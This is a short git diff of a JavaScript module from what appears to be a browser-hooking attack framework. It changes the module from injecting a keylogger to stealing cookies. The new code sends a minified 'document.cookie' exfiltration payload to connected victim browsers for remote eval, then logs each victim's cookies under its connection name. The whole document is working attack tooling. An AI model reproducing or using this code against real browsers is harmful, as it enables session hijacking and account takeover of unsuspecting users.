@@ -1,15 +1,15 @@
 exports.data = {
 	//info about the module
 	info: function(step /*optional */) {
-		console.log("Injects a keylogger");
+		console.log("Steal cookie current page");
 		console.log("Type exec to send the payload");
 	},
 
 	//handler for parsing responses
 	handler: function(options, connection, obj) {
-		if ("keylogger" in obj) {
+		if ("getcookie" in obj) {
 			console.log("");
-			console.log('['+connection.name+'] KEYLOGGER:'+obj.keylogger);
+			console.log('['+connection.name+'] GETCOOKIE:'+obj.getcookie);
 		}
 	},
 
@@ -17,7 +17,7 @@ exports.data = {
 	exec: function(options,targets,step /* optional */) {
 		var fs = require('fs');
 		var UglifyJS = require("uglify-js");
-		var payload = UglifyJS.minify(fs.readFileSync(__dirname + '/../payloads/keylogger.js','utf8'),{ie8:true}).code; //TODO ERROR CHECK
+		var payload = UglifyJS.minify('send({getcookie:document.cookie})',{ie8:true}).code; //TODO ERROR CHECK
 		for (var i in targets) {
 			targets[i].sendUTF(JSON.stringify({ request: 'eval', content: payload }));
 		}
